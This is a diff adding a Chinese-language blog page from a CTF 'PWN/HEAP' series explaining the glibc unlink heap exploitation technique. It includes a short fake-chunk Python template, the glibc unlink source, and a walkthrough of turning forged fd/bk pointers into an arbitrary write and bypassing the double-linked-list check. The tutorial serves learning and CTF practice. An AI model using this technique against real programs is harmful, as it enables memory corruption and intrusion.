@@ -1,0 +1,1139 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="TY">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Knowledge points of HEAP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Unlink">
+<meta property="og:url" content="https://tforevery.github.io/PWN/HEAP/Unlink/index.html">
+<meta property="og:site_name" content="TY&#39;s Blog">
+<meta property="og:description" content="Knowledge points of HEAP">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tforevery.github.io/Images/1743064752606-86f7b81c-44ab-460e-91c8-209d2df5e3f2-1750152657150-29.png">
+<meta property="og:image" content="https://tforevery.github.io/Images/1750085222497-cb92602d-7946-4eae-a5dc-d439b1038389.png">
+<meta property="og:image" content="https://tforevery.github.io/Images/1750085484389-7a32c416-88fc-4352-9ec5-b4564b8d5d09.png">
+<meta property="og:image" content="https://tforevery.github.io/Images/1750126775439-056107b1-7449-4c73-a9e0-1f6c56f595c8.png">
+<meta property="og:image" content="https://tforevery.github.io/Images/1750127332600-8f64c6a0-c234-4d19-887a-cc7b4b53d442.png">
+<meta property="og:image" content="https://tforevery.github.io/Images/1750129191691-9dff88cf-988b-442f-9451-8f8aa722fca5.png">
+<meta property="og:image" content="https://tforevery.github.io/Images/1750132313955-72309535-f668-41bd-93c1-bcf783db54b3.png">
+<meta property="og:image" content="https://tforevery.github.io/Images/1750133117351-095645ec-ca5a-4383-8c6b-758e2a1529ee.png">
+<meta property="og:image" content="https://tforevery.github.io/Images/1750133461998-e1939518-e471-44ae-b1d8-c67734f0c244.png">
+<meta property="og:image" content="https://tforevery.github.io/Images/1750133652417-3792d8ab-574d-4ade-98ed-abc6cfb0f26a.png">
+<meta property="og:image" content="https://tforevery.github.io/Images/1750083538368-94f978b3-f22a-44da-b808-f044409a05e7.png">
+<meta property="og:image" content="https://tforevery.github.io/Images/1750083781947-ad488819-d15b-4dbb-ad8d-c4cdce393181.png">
+<meta property="og:image" content="https://tforevery.github.io/Images/1750083903679-efef5470-6839-4eb4-aa8b-a8d6b568aa28.png">
+<meta property="og:image" content="https://tforevery.github.io/Images/1750134869456-05c2d7b1-e81d-4cd0-9559-f28a57802049.png">
+<meta property="article:published_time" content="2025-12-23T16:50:01.000Z">
+<meta property="article:modified_time" content="2025-12-23T17:13:48.174Z">
+<meta property="article:author" content="TY">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://tforevery.github.io/Images/1743064752606-86f7b81c-44ab-460e-91c8-209d2df5e3f2-1750152657150-29.png">
+  
+  
+  
+  <title>Unlink - TY&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tforevery.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"4pk0DV0Gzc6TMpnuyhQwgcgs-gzGzoHsz","app_key":"4MnQ5z5ovVgFNdAOxLy5UlVV","server_url":"https://4pk0dv0g.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>TY</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Unlink"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-12-24 00:50" pubdate>
+          2025年12月24日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          18 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="PWN"
+        id="heading-9ff4c26c1ae7cc7c11352087a2fa7ed2" role="tab" data-toggle="collapse" href="#collapse-9ff4c26c1ae7cc7c11352087a2fa7ed2"
+        aria-expanded="true"
+      >
+        PWN
+        <span class="list-group-count">(12)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-9ff4c26c1ae7cc7c11352087a2fa7ed2"
+           role="tabpanel" aria-labelledby="heading-9ff4c26c1ae7cc7c11352087a2fa7ed2">
+        
+        
+          
+          
+  <div class="category-post-list">
+    
+    
+  </div>
+
+          
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="BUUCTF"
+        id="heading-20cbba83d944fc64ea203deb4df2127a" role="tab" data-toggle="collapse" href="#collapse-20cbba83d944fc64ea203deb4df2127a"
+        aria-expanded="false"
+      >
+        BUUCTF
+        <span class="list-group-count">(4)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-20cbba83d944fc64ea203deb4df2127a"
+           role="tabpanel" aria-labelledby="heading-20cbba83d944fc64ea203deb4df2127a">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/PWN/BUUCTF/PWN-BUUCTF-1/" title="PWN-BUUCTF-1"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">PWN-BUUCTF-1</span>
+        </a>
+      
+    
+      
+      
+        <a href="/PWN/BUUCTF/PWN-BUUCTF-2/" title="PWN-BUUCTF-2"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">PWN-BUUCTF-2</span>
+        </a>
+      
+    
+      
+      
+        <a href="/PWN/BUUCTF/PWN-BUUCTF-3/" title="PWN-BUUCTF-3"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">PWN-BUUCTF-3</span>
+        </a>
+      
+    
+      
+      
+        <a href="/PWN/BUUCTF/PWN-BUUCTF-4/" title="PWN-BUUCTF-4"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">PWN-BUUCTF-4</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="HEAP"
+        id="heading-b6722804f5872cdd88347da194d42087" role="tab" data-toggle="collapse" href="#collapse-b6722804f5872cdd88347da194d42087"
+        aria-expanded="true"
+      >
+        HEAP
+        <span class="list-group-count">(7)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-b6722804f5872cdd88347da194d42087"
+           role="tabpanel" aria-labelledby="heading-b6722804f5872cdd88347da194d42087">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/PWN/HEAP/Heap-block-overlap/" title="Heap block overlap"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">Heap block overlap</span>
+        </a>
+      
+    
+      
+      
+        <a href="/PWN/HEAP/House-Of-Force/" title="House Of Force"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">House Of Force</span>
+        </a>
+      
+    
+      
+      
+        <a href="/PWN/HEAP/House-Of-Spirit/" title="House Of Spirit"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">House Of Spirit</span>
+        </a>
+      
+    
+      
+      
+        <a href="/PWN/HEAP/Off-By-One/" title="Off By One"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">Off By One</span>
+        </a>
+      
+    
+      
+      
+        <a href="/PWN/HEAP/UAF/" title="UAF"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">UAF</span>
+        </a>
+      
+    
+      
+      
+        <a href="/PWN/HEAP/Unlink/" title="Unlink"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">Unlink</span>
+        </a>
+      
+    
+      
+      
+        <a href="/PWN/HEAP/Unsorted-bin-Attack/" title="Unsorted bin Attack"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">Unsorted bin Attack</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="STACK"
+        id="heading-0fac686d86aba414411b58f6bce53a76" role="tab" data-toggle="collapse" href="#collapse-0fac686d86aba414411b58f6bce53a76"
+        aria-expanded="false"
+      >
+        STACK
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-0fac686d86aba414411b58f6bce53a76"
+           role="tabpanel" aria-labelledby="heading-0fac686d86aba414411b58f6bce53a76">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/PWN/STACK/Stack-pivoting/" title="Stack pivoting"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">Stack pivoting</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Unlink</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年12月24日 凌晨
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/introduction/">CTF-WIKI</a></p>
+<h1 id="Fake-thunk模板"><a href="#Fake-thunk模板" class="headerlink" title="Fake_thunk模板"></a>Fake_thunk模板</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#AMD64下实现fake_thunk</span><br>add(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><br>thunk_ptr = <span class="hljs-number">0x006020C0</span><br>fakefd = thunk_ptr - <span class="hljs-number">0x18</span><br>fakebk = thunk_ptr - <span class="hljs-number">0x10</span><br><br>fake_thunk = p(<span class="hljs-number">0</span>)<br>fake_thunk += p(<span class="hljs-number">0x41</span>)<br>fake_thunk += p(fakefd)<br>fake_thunk += p(fakebk)<br>fake_thunk += junk(<span class="hljs-number">0x20</span>)<br><br>fake_thunk += p(<span class="hljs-number">0x40</span>)<br>fake_thunk += p(<span class="hljs-number">0x90</span>)<br></code></pre></td></tr></table></figure>
+
+
+
+<p>thunk结构</p>
+<p><img src="/../../../Images/1743064752606-86f7b81c-44ab-460e-91c8-209d2df5e3f2-1750152657150-29.png" srcset="/img/loading.gif" lazyload></p>
+<p>Unlink： 将一个空闲的 chunk 从双向链表中移除，更新BK、FD的bk、fd（BK、FD都是一个thunk）</p>
+<p>简单来说将一个thunk从一个双向链表中删除，但是保证这个双向链表不被破坏</p>
+<ul>
+<li>fd：指向下一个空闲的 chunk</li>
+<li>bk：指向上一个空闲的 chunk</li>
+</ul>
+<p>个人理解：<br>Unlink有点像连带责任，P走了，那么BK、FD就要必须更新新的信息</p>
+<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c">unlink(AV, P, BK, FD)                                                                                                       <br>    &#123;                                                                                                                               <br>        FD = P-&gt;fd;                                                                                                                 <br>        BK = P-&gt;bk;                                                                                                                 <br>        <span class="hljs-keyword">if</span> (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))                                                                        <br>            malloc_printerr(check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);                                                   <br>        <span class="hljs-keyword">else</span>                                                                                                                        <br>        &#123;                                                                                                                           <br>            FD-&gt;bk = BK;                                                                                                            <br>            BK-&gt;fd = FD;                                                                                                            <br>            <span class="hljs-keyword">if</span> (!in_smallbin_range(P-&gt;size) &amp;&amp; __builtin_expect(P-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))                                         <br>            &#123;                                                                                                                       <br>                <span class="hljs-keyword">if</span> (__builtin_expect(P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>) || __builtin_expect(P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>)) <br>                    malloc_printerr(check_action,                                                                                   <br>                                    <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,                                                     <br>                                    P, AV);                                                                                         <br>                <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>)                                                                                        <br>                &#123;                                                                                                                   <br>                    <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)                                                                                        <br>                        FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                                                                     <br>                    <span class="hljs-keyword">else</span>                                                                                                            <br>                    &#123;                                                                                                               <br>                        FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                                                                           <br>                        FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                                                                           <br>                        P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                                                                           <br>                        P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                                                                           <br>                    &#125;                                                                                                               <br>                &#125;                                                                                                                   <br>                <span class="hljs-keyword">else</span>                                                                                                                <br>                &#123;                                                                                                                   <br>                    P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                                                                   <br>                    P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                                                                   <br>                &#125;                                                                                                                   <br>            &#125;                                                                                                                       <br>        &#125;                                                                                                                           <br>    &#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="1-原先的双向链表"><a href="#1-原先的双向链表" class="headerlink" title="1. 原先的双向链表"></a>1. 原先的双向链表</h2><p><img src="/../../../Images/1750085222497-cb92602d-7946-4eae-a5dc-d439b1038389.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="2-Unlink后的双向链表（Unlink-P-）"><a href="#2-Unlink后的双向链表（Unlink-P-）" class="headerlink" title="2. Unlink后的双向链表（Unlink(P)）"></a>2. Unlink后的双向链表（Unlink(P)）</h2><p>也就说<code>Unlink(P)</code></p>
+<ul>
+<li>BK-&gt;fd &#x3D; P-&gt;fd &#x3D; FD</li>
+<li>FD-&gt;bk &#x3D; P-&gt;bk &#x3D; BK</li>
+</ul>
+<blockquote>
+<p>那也就说<br>当我们设置了<code>P-&gt;bk</code>的值，那么<code>FD-&gt;bk</code>也会被我们设置<br>当我们设置了<code>P-&gt;fd</code>的值，那么<code>BK-&gt;fd</code>也会被我们设置<br>而FD、BK又是由P-&gt;fd、P-&gt;bk来决定的<br>这就实现了任意内存写</p>
+</blockquote>
+<p><img src="/../../../Images/1750085484389-7a32c416-88fc-4352-9ec5-b4564b8d5d09.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="a-fd-bk"><a href="#a-fd-bk" class="headerlink" title="a. fd !&#x3D; bk"></a>a. fd !&#x3D; bk</h3><blockquote>
+<p>P-&gt;fd &#x3D; 0x1234<br>P-&gt;bk &#x3D; 0x5678<br>那么<br>BK &#x3D; 0x5678<br>FD &#x3D; 0x1234<br><em>((size_t</em>)BK+2) &#x3D; P-&gt;fd &#x3D;&#x3D; 0x1234<br><em>((size_t</em>)FD+3) &#x3D; P-&gt;bk &#x3D;&#x3D; 0x5678<br>能看到，两个不同的地址<code>*((size_t*)BK+2)``*((size_t*)FD+3)</code>，通过Unlink实现了覆写</p>
+</blockquote>
+<p><img src="/../../../Images/1750126775439-056107b1-7449-4c73-a9e0-1f6c56f595c8.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="b-fd-bk"><a href="#b-fd-bk" class="headerlink" title="b. fd &#x3D; bk"></a>b. fd &#x3D; bk</h3><blockquote>
+<p>P-&gt;fd &#x3D; 0x1234<br>P-&gt;bk &#x3D; 0x1234<br>BK &#x3D; 0x1234<br>FD &#x3D; 0x1234<br><em>((size_t</em>)BK+2) &#x3D; P-&gt;fd &#x3D;&#x3D; 0x1234<br><em>((size_t</em>)FD+3) &#x3D; P-&gt;bk &#x3D;&#x3D; 0x1234</p>
+<ul>
+<li>*((size_t*)thunk+2) &#x3D; P-&gt;fd &#x3D;&#x3D; 0x1234*</li>
+<li><em>*((size_t</em>)thunk+3) &#x3D; P-&gt;bk &#x3D;&#x3D; 0x1234<br>依据这个特性，那么我们就可以实现定点写入<br>  <img src="/../../../Images/1750127332600-8f64c6a0-c234-4d19-887a-cc7b4b53d442.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+</blockquote>
+<h3 id="c-定点"><a href="#c-定点" class="headerlink" title="c. 定点"></a>c. 定点</h3><blockquote>
+<p>写入<code>fd</code>的位置<br>P-&gt;fd &#x3D; target-1<br>P-&gt;bk &#x3D; target<br>BK &#x3D; target<br>FD &#x3D; target-1<br><em>((size_t</em>)BK+2) &#x3D; P-&gt;fd<br><em>((size_t</em>)FD+3) &#x3D; P-&gt;bk </p>
+<ul>
+<li>*((size_t*)thunk+3) &#x3D; P-&gt;fd</li>
+<li>*((size_t*)thunk+3) &#x3D; P-&gt;bk</li>
+</ul>
+</blockquote>
+<p><img src="/../../../Images/1750129191691-9dff88cf-988b-442f-9451-8f8aa722fca5.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>如果只考虑一个（FD或者BK的话）那么会更简单<br>比如说我只考虑BK<br>那么<br>P-&gt;fd &#x3D; value<br>P-&gt;bk &#x3D; target_addr<br>就是实现了<br><code>*((size_t*)target_addr+2) = value</code><br>反之：<br>P-&gt;fd &#x3D; target_addr<br>P-&gt;bk &#x3D; value<br>就是实现了<br><code>*((size_t*)target_addr+3) = value</code><br>再简化一下<br>只考虑BK<br>P-&gt;fd &#x3D; value<br>P-&gt;bk &#x3D; target_addr - 2</p>
+</blockquote>
+<p><code>*((size_t*)target_addr) = value</code><br>只考虑FD<br>P-&gt;fd &#x3D; target_addr - 3<br>P-&gt;bk &#x3D; value<br><code>*((size_t*)target_addr) = value</code></p>
+<h2 id="3-无check"><a href="#3-无check" class="headerlink" title="3. 无check"></a>3. 无check</h2><p>在早期，是不存在检查的，也就说，直接通过P-&gt;fd、P-&gt;bk的设置，触发Unlink(P)就可以实现任意内存写的操作</p>
+<h2 id="4-check"><a href="#4-check" class="headerlink" title="4. check"></a>4. check</h2><p>现实很残酷，有洞，总要修的，但是洞是修不完的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)<br><span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="hljs-number">0</span>))      \<br>      malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);               \<br>// 检查 fd 和 bk 指针(双向链表完整性检查)<br><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))                      \<br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \<br><br>  // largebin 中 next_size 双向链表完整性检查 <br>              <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)              \<br>                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))    \<br>              malloc_printerr (check_action,                                      \<br>                               <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,    \<br>                               P, AV);<br></code></pre></td></tr></table></figure>
+
+<p>增加check后，我们来理解下fd、bk的检查</p>
+<ul>
+<li>FD-&gt;bk !&#x3D; P</li>
+<li>BK-&gt;fd !&#x3D; P</li>
+</ul>
+<p>要想绕过check</p>
+<ul>
+<li><p>FD-&gt;bk &#x3D; P</p>
+</li>
+<li><p>BK-&gt;fd &#x3D; P</p>
+</li>
+<li><p>(P-&gt;fd)-&gt;bk &#x3D; P</p>
+</li>
+<li><p>(P-&gt;bk)-&gt;fd &#x3D; P</p>
+</li>
+</ul>
+<p>来看看我们之前的图：绿色代表FD、BK能够通过check的指向，红色代表我们触发Unlink后FD、BK的指向</p>
+<ul>
+<li><p>FD-&gt;bk &#x3D; BK</p>
+</li>
+<li><p>BK-&gt;fd &#x3D; FD</p>
+</li>
+<li><p>(P-&gt;fd)-&gt;bk &#x3D; BK</p>
+</li>
+<li><p>(P-&gt;bk)-&gt;fd &#x3D; FD</p>
+</li>
+</ul>
+<p><img src="/../../../Images/1750132313955-72309535-f668-41bd-93c1-bcf783db54b3.png" srcset="/img/loading.gif" lazyload></p>
+<p>这样看，我们就可以通过定点这个知识点（上边）可以轻松解决</p>
+<p>把BK和FD看成一个大的target_thunk，在target_thunk中BK和FD重合，且在<code>target_thunk中存在P的地址</code>就可以实现绕过了，上图理解下</p>
+<p>target_thunk中存在P的地址</p>
+<p><img src="/../../../Images/1750133117351-095645ec-ca5a-4383-8c6b-758e2a1529ee.png" srcset="/img/loading.gif" lazyload></p>
+<p>通过P-&gt;bk、P-&gt;fd布局，使得FD-&gt;bk &#x3D; P、BK-&gt;fd &#x3D; P</p>
+<p><img src="/../../../Images/1750133461998-e1939518-e471-44ae-b1d8-c67734f0c244.png" srcset="/img/loading.gif" lazyload></p>
+<p>但是一般来说都是只知道P地址的存储地址，那么我们来转换一下</p>
+<p><img src="/../../../Images/1750133652417-3792d8ab-574d-4ade-98ed-abc6cfb0f26a.png" srcset="/img/loading.gif" lazyload></p>
+<p>这样的结果是P_ptr被覆盖成了P-&gt;fd &#x3D;&#x3D; P_Addr-3，至于为什么不是P_Addr-2</p>
+<p>看源码我们能知道代码执行的先后顺序</p>
+<ol>
+<li><code>FD-&gt;bk = BK</code></li>
+<li><code>BK-&gt;fd = FD</code></li>
+</ol>
